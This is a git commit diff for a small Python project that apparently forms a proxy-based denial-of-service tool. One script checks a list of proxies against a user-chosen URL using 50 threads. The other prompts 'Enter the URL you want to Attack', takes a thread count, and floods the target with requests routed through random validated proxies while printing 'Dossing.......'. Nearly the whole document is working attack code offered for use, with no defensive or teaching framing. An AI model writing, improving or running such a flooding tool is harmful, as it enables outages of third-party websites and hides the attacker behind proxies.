4072cffa9a36a72fc9ec2ebbb4b94c7f79b81d2b
nishanth <nishanth23082004@gmail.com>
2023-12-27 20:53:09 +0530

    final

--- checkproxy.py
+++ checkproxy.py
@@ -5,6 +5,35 @@ import queue
 q= queue.Queue()
 valid_proxies = queue.Queue()
 
+
+print("""
+          .                                                      .
+        .n                   .                 .                  n.
+  .   .dP                  dP                   9b                 9b.    .
+ 4    qXb         .       dX                     Xb       .        dXp     t
+dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+ 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
+                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
+                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
+                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
+                     `'      9XXXXXX(   )XXXXXXP      `'
+                              XXXX X.`v'.X XXXX
+                              XP^X'`b   d'`X^XX
+                              X. 9  `   '  P )X
+                              `b  `       '  d'
+                               `             '
+Test Your Poxy
+      
+      """)
+
+url = input("Enter Target Url to Test Proxy:")
+
 with open("ProxyList.txt","r") as f:
     proxy = f.read().split("\n")
     for p in proxy:
@@ -18,18 +47,17 @@ def check_proxy():
     while not q.empty():
         proxy = q.get()
         try:
-            r = requests.get("https://api.ipify.org?format=json",proxies={"http":proxy,"https":proxy})
+            r = requests.get(url,proxies={"http":proxy,"https":proxy})
         except:
             continue
         if(r.status_code == 200):
-            print(proxy)
-            with open("ValidProxy.txt","a") as vali_prox:
+             print(f"Added to list: {proxy}")
+             with open("ValidProxy.txt","a") as vali_prox:
                 vali_prox.write(proxy+"\n")
            
 
 for _ in range(50):
-    threading.Thread(target=check_proxy).start()           
-
-
+    threading.Thread(target=check_proxy).start()        
+print("This are Working proxy thay are appended to ValidProxy.txt")
 
 
--- main.py
+++ main.py
@@ -16,10 +16,36 @@ def random_user_agent():
     }
     return headers
 
+print("""
+          .                                                      .
+        .n                   .                 .                  n.
+  .   .dP                  dP                   9b                 9b.    .
+ 4    qXb         .       dX                     Xb       .        dXp     t
+dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+ 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
+                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
+                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
+                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
+                     `'      9XXXXXX(   )XXXXXXP      `'
+                              XXXX X.`v'.X XXXX
+                              XP^X'`b   d'`X^XX
+                              X. 9  `   '  P )X
+                              `b  `       '  d'
+                               `             '
+
+ Niha      
+      
+      """)
+
 url=input("Enter the URL you want to Attack:")
 Thread =int(input("Enter the No: of Threads:"))
 # url = "http://ipinfo.io/json"
-# url = "https://centinels.zeal.ninja/"
 # Thread = 1024
 valied_proxy=[]
 
@@ -27,17 +53,16 @@ with open("ValidProxy.txt","r") as f:
     valied_proxy = f.read().split("\n")
 
 def send_req(url):
+  print("Dossing.......")
 
   for _ in range(10):
         int = random.randint(0,len(valied_proxy) -1)
-        proxy = {
-        'http': valied_proxy[int],
-        'https': valied_proxy[int]
-        }
-     
         try:
             # print(proxy)
-            res = requests.get(url, headers=random_user_agent(),proxies=proxy)
+            res = requests.get(url, proxies={
+        'http': valied_proxy[int],
+        'https': valied_proxy[int]
+        })
             print(res.json())
         except Exception as e:
             print(f"Error making request to {url}: {e}")  
